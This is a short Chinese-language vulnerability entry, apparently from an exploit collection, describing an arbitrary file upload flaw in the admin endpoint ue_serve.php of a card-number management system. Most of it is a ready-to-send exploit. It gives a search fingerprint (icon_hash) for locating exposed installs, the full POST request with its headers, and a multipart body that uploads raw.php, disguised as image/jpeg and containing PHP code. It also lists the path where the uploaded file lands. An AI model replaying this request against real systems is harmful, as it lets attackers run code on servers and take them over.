# 卡号极团管理系统ue_serve存在任意文件上传漏洞

- **系统**：卡号极团管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-795291075"`
- **请求**：`POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/2`
- **关键头**：`Cookie: PHPSESSID=ecq4ucplk5n6e3ipihvktl103r`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZ…`　`Content-Length: 301`

**请求体 / payload**
```
------WebKitFormBoundarylkv1kpsZgzw2WC03
Content-Disposition: form-data; name="name"
raw.php
------WebKitFormBoundarylkv1kpsZgzw2WC03
Content-Disposition: form-data; name="upfile"; filename="raw.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundarylkv1kpsZgzw2WC03--

上传文件位置
/upload/660c0ab3990c5_raw.php
```

**其他**
- 卡号极团管理系统ue\_serve存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 卡号极团管理系统